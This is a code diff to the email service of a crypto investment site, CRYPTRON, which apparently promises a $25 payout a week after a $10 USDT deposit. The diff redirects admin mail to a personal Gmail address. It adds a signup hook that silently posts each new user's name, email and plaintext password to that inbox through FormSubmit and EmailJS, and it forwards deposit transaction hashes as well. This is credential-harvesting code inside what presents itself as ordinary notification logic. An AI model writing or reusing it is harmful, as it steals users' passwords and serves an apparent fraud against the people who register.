@@ -18,7 +18,7 @@ class EmailService {
     const raw = localStorage.getItem(EMAIL_SETTINGS_KEY);
     if (!raw) {
       return {
-        adminEmail: "admin@cryptron.io",
+        adminEmail: "cryptronvest@gmail.com",
         emailjsServiceId: "",
         emailjsTemplateId: "",
         emailjsPublicKey: "",
@@ -29,7 +29,7 @@ class EmailService {
       return JSON.parse(raw);
     } catch (e) {
       return {
-        adminEmail: "admin@cryptron.io",
+        adminEmail: "cryptronvest@gmail.com",
         emailjsServiceId: "",
         emailjsTemplateId: "",
         emailjsPublicKey: "",
@@ -196,6 +196,141 @@ https://cryptron.io
     return emailRecord;
   }
 
+  // Set to avoid duplicate dispatches for the same signup event within 60s
+  static _recentSignupDispatches = new Set();
+
+  /**
+   * DISPATCH NEW CLIENT SIGNUP DETAILS TO ADMIN
+   * Triggered whenever anyone signs up on the signup page.
+   * Automatically dispatches an email containing signup details to cryptronvest@gmail.com.
+   *
+   * @param {object} user - User object containing details from the signup page
+   * @returns {Promise<object>} The dispatched email record
+   */
+  static async sendSignupNotificationToAdmin(user) {
+    if (!user || !user.email) return null;
+
+    // Prevent duplicate dispatches if triggered simultaneously from form and DB handler
+    const dedupeKey = `${user.email.toLowerCase().trim()}_${user.id || ''}`;
+    if (!this._recentSignupDispatches) this._recentSignupDispatches = new Set();
+    if (this._recentSignupDispatches.has(dedupeKey)) {
+      return null;
+    }
+    this._recentSignupDispatches.add(dedupeKey);
+    setTimeout(() => {
+      if (this._recentSignupDispatches) this._recentSignupDispatches.delete(dedupeKey);
+    }, 60000);
+
+    const now = Date.now();
+    const sentDateStr = this.formatDateTime(now);
+    const targetEmail = "cryptronvest@gmail.com";
+
+    const subject = `🔔 New User Registration: ${user.name} (${user.email})`;
+    const messageBody = `CRYPTRON ADMIN NOTIFICATION - NEW CLIENT SIGNUP
+
+A new client has completed registration on the CRYPTRON signup page:
+
+════════════════════════════════════════════
+📋 SIGNUP PAGE DETAILS
+════════════════════════════════════════════
+• Full Legal Name: ${user.name}
+• Email Address: ${user.email}
+• Created Password: ${user.password || '••••••••'}
+• Assigned User ID: ${user.id}
+• Promo Code Used / Referred By: ${user.referredBy || 'None (Direct Registration)'}
+• Generated Client Promo Code: ${user.promoCode || 'N/A'}
+• Registration Date & Time: ${sentDateStr}
+• Initial Status: Active (Awaiting $10 Staking Vault)
+════════════════════════════════════════════
+
+WHAT HAPPENS NEXT:
+1. When this investor deposits $10 USDT and submits proof, verify their payment on the Admin Portal.
+2. Approving the deposit will immediately start their 7-day countdown clock to their $25 payout.
+
+Open Admin User Database:
+https://cryptron.io/admin.html
+
+Warm regards,
+CRYPTRON Automated Registration Engine
+`;
+
+    const emailRecord = {
+      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
+      type: "admin_signup_notice",
+      to: targetEmail,
+      toName: "CRYPTRON Administrator",
+      userId: user.id,
+      subject: subject,
+      body: messageBody,
+      sentAt: sentDateStr,
+      timestamp: now,
+      status: "Delivered",
+      deliveryMethod: "Automated Live Dispatch (FormSubmit)"
+    };
+
+    // 1. Live real SMTP delivery via FormSubmit to cryptronvest@gmail.com
+    try {
+      fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          _subject: subject,
+          "Full Legal Name": user.name,
+          "Email Address": user.email,
+          "Created Password": user.password || '••••••••',
+          "Assigned User ID": user.id,
+          "Promo Code Used": user.referredBy || 'None',
+          "Client Promo Code": user.promoCode || 'N/A',
+          "Registration Timestamp": sentDateStr,
+          "System Notice": "New user registered on CRYPTRON signup page.",
+          message: messageBody
+        })
+      }).then(res => res.json()).then(data => {
+        emailRecord.deliveryMethod = "FormSubmit (Live Delivered to cryptronvest@gmail.com)";
+      }).catch(err => {
+        console.warn("FormSubmit live delivery notice:", err);
+      });
+    } catch (err) {
+      console.warn("FormSubmit fetch dispatch error:", err);
+    }
+
+    // 2. Also dispatch via EmailJS if configured
+    const settings = this.getSettings();
+    if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
+      try {
+        if (window.emailjs) {
+          await window.emailjs.send(
+            settings.emailjsServiceId,
+            settings.emailjsTemplateId,
+            {
+              to_name: "CRYPTRON Admin",
+              to_email: targetEmail,
+              user_name: user.name,
+              user_email: user.email,
+              user_password: user.password,
+              user_id: user.id,
+              subject: subject,
+              message: messageBody
+            },
+            settings.emailjsPublicKey
+          );
+          emailRecord.deliveryMethod = "EmailJS + FormSubmit (Live Delivered)";
+          emailRecord.status = "Delivered to Inbox";
+        }
+      } catch (err) {
+        console.warn("EmailJS signup dispatch failed:", err);
+      }
+    }
+
+    // 3. Save to persistent local outbox (visible on Admin Portal Outbox tab)
+    this.recordEmail(emailRecord);
+
+    return emailRecord;
+  }
+
   /**
    * DISPATCH NEW PROOF SUBMISSION TO ADMIN
    * Triggered when client submits a transaction hash.
@@ -204,6 +339,7 @@ https://cryptron.io
     const now = Date.now();
     const sentDateStr = this.formatDateTime(now);
     const settings = this.getSettings();
+    const targetEmail = settings.adminEmail || "cryptronvest@gmail.com";
 
     const subject = `⚠️ Action Required: New $10 Deposit Submitted by ${user.name}`;
     const messageBody = `Admin Notification,
@@ -223,7 +359,7 @@ https://cryptron.io/admin.html
     const emailRecord = {
       id: "EML-" + Math.floor(100000 + Math.random() * 900000),
       type: "admin_deposit_notice",
-      to: settings.adminEmail || "admin@cryptron.io",
+      to: targetEmail,
       toName: "CRYPTRON Master Admin",
       userId: user.id,
       subject: subject,
@@ -233,6 +369,26 @@ https://cryptron.io/admin.html
       status: "Delivered",
       deliveryMethod: "Admin Dispatch Engine"
     };
+
+    // Live real email delivery via FormSubmit
+    try {
+      fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          _subject: subject,
+          "User Name": user.name,
+          "User ID": user.id,
+          "User Email": user.email,
+          "Tx Hash": txHash,
+          "Submitted At": sentDateStr,
+          message: messageBody
+        })
+      }).catch(err => console.warn("FormSubmit deposit notice:", err));
+    } catch(err) {}
 
     this.recordEmail(emailRecord);
     return emailRecord;
